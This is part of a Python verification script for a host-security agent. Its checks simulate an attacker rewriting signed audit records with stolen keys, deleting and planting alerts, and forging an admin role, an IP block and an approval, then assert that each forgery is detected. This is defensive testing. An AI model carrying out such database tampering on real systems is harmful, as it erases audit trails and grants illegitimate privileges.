    assert verify_export([as_json(r) for r in rows], genesis_pin=genesis)["ok"]
    # attacker: master key + the only signing key left -> rewrite record 3 perfectly (hash, MAC, signature)
    chain, stolen = SigningChain(store.keys.dir), next(iter(on_disk))
    db = _raw(store)
    r = dict(db.execute("SELECT *, id AS seq FROM audit WHERE id = 3").fetchone(), actor="admin1", pub=stolen)
    r["hash"] = audit_hash(r, r["prev_hash"])
    db.execute("UPDATE audit SET actor=?, pub=?, hash=?, mac=?, sig=? WHERE id=3",
               ("admin1", stolen, r["hash"], store.keys.audit_mac(r["hash"]), chain.sign(chain.load(stolen), r["hash"])))
    db.execute("UPDATE audit SET prev_hash=? WHERE id=4", (r["hash"],))
    res = Store(store.path).verify_audit()
    assert not res["ok"] and any("does not continue" in p["problem"] for p in res["problems"]), res["problems"]
    assert not verify_export([as_json(x) for x in store.query("SELECT *, id AS seq FROM audit ORDER BY id")])["ok"]
    return (f"{len(rows)} records each signed by a one-time Ed25519 key, 1 key on disk (the next one); rewrite with "
            f"stolen keys detected locally and in the SIEM copy; genesis {genesis[:22]}...")


@check("R8.2", "alerts and the actions log are tamper-evident (signed ledger): edits, inserts, deletions detected")
def _():
    from eldoctor.models import ActionResult, Alert
    from eldoctor.storage import Store
    store = Store()
    a1, a2 = Alert(rule_id="A", title="hog", severity="high"), Alert(rule_id="B", title="miner", severity="critical")
    store.add_alert(a1)
    store.add_alert(a2)
    store.add_action(ActionResult("kill", "success", "killed", "x[1]"), a1.id, "pb", "enforce", "agent")
    assert store.verify_audit()["ok"]
    db = _raw(store)
    db.execute("UPDATE alerts SET severity='low' WHERE id=?", (a1.id,))
    db.execute("DELETE FROM alerts WHERE id=?", (a2.id,))
    db.execute("UPDATE actions SET status='failed'")
    db.execute("INSERT INTO alerts (id, ts, rule_id, title, severity) VALUES ('fake', 1, 'X', 'planted', 'high')")
    txt = " | ".join(p["problem"] for p in Store(store.path).verify_audit()["problems"])
    found = [w for w in ("modified", "deleted", "inserted") if w in txt]
    assert len(found) == 3 and "action" in txt, txt
    assert Store(store.path).ledger_state("alert", store.get_alert(a1.id)) == "tampered"
    return "downplayed alert, deleted alert, rewritten kill and planted alert all reported by verify (" + \
        ", ".join(found) + ")"


@check("R8.3", "HMAC-key holder cannot forge state the agent acts on (role, IP block, approval request)")
def _():
    from eldoctor.auth.users import UserManager
    from eldoctor.models import Alert
    cfg, store, owner = admin()
    um = UserManager(store, cfg)
    um.register("attacker_user", "M4llory!Passw0rd", "m@example.invalid")
    r = dict(store.query("SELECT * FROM users WHERE username='attacker_user'")[0], role="admin")
    db = _raw(store)
    db.execute("UPDATE users SET role='admin', seal=? WHERE id=?", (store.keys.seal("user", store._user_fields(r)), r["id"]))
    fake = {"ip": "8.8.8.8", "ts": 0.0, "expires": 0.0, "reason": "x", "alert_id": "", "backend": "app-level", "active": 1}
    db.execute("INSERT INTO blocked_ips VALUES ('8.8.8.8', 0, 0, 'x', '', 'app-level', 1, ?)", (store._block_seal(fake),))
    aid = store.create_approval(Alert(rule_id="X", title="t", severity="high", remote_ip="203.0.113.9"), "pb", 0, "s", 300)
    ap = dict(store.get_approval(aid), step_index=7)
    db.execute("UPDATE approvals SET step_index=7, req_mac=? WHERE id=?",
               (store.keys.seal("approval_request", store._approval_req_fields(ap)), aid))
    assert um.get("attacker_user") is None
    assert "8.8.8.8" not in [b["ip"] for b in store.active_blocks()]
    assert not store.decide_approval(aid, True, owner.username)
    return "recomputed HMAC seals accepted by no check: role=admin, forged IP block, retargeted approval all refused"


# ============================================================================ full mode
def full_checks() -> List[Callable]:
    @check("T.1", "full automated test suite (pytest)")
    def tests():
        py = _tk_python() if os.environ.get("DISPLAY") or not sys.platform.startswith("linux") else None
        py = py or sys.executable
        _ensure_pytest(py)
        r = subprocess.run([py, "-m", "pytest", "-q", "-p", "no:warnings"], cwd=str(ROOT), capture_output=True,
                           text=True, timeout=1800, env=dict(os.environ, PYTHONPATH=str(ROOT)))
        assert r.returncode == 0, r.stdout[-1200:]
        return r.stdout.strip().splitlines()[-1] + f" (python {py})"

    @check("T.2", "live purple-team lab: 15 attack scenarios vs running agent (enforce)")
    def lab():
        if not sys.platform.startswith("linux") or not shutil.which("gcc"):
            raise SkipCheck("lab needs Linux + gcc")
        r = subprocess.run(["bash", str(ROOT / "scripts" / "lab.sh"), "enforce"], cwd=str(ROOT), capture_output=True,
                           text=True, timeout=1500, env=dict(os.environ, PYTHON=sys.executable,
                                                             ELDOCTOR_HOME=os.environ["ELDOCTOR_HOME"]))
        subprocess.run(["pkill", "-f", "lab_config.yaml run"], capture_output=True)
        subprocess.run(["pkill", "-f", "mock_receivers.py"], capture_output=True)
        last = [l for l in r.stdout.splitlines() if "scenarios passed" in l]
        assert last and last[-1].startswith("15/15"), (last or r.stdout[-800:])
        return last[-1]
    return [tests, lab]


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--full", action="store_true",
                    help="also run the full pytest suite and the 15-scenario lab (the lab runs a live enforce-mode "
                         "agent for the whole machine for ~4 minutes)")
    ap.add_argument("--json", help="write the results to this JSON file")
    args = ap.parse_args()
    if args.full:
        full_checks()                      # registers T.1 / T.2
    checks = list(CHECKS)
    print(f"El Doctor requirement verification - python {sys.version.split()[0]} ({sys.executable})\n")
    for c in checks:
        c()
    print("\n" + "=" * 100)
    for req, name, status, ev in RESULTS:
        print(f"{status:<4}  {req:<5} {name}\n              -> {ev}")
    n = {s: sum(1 for r in RESULTS if r[2] == s) for s in ("PASS", "FAIL", "SKIP")}
    print("=" * 100 + f"\n{n['PASS']} passed, {n['FAIL']} failed, {n['SKIP']} skipped")
    if args.json:
        Path(args.json).write_text(json.dumps([dict(zip(("req", "check", "status", "evidence"), r)) for r in RESULTS],
                                              indent=2))
    return 1 if n["FAIL"] else 0


if __name__ == "__main__":
    raise SystemExit(main())
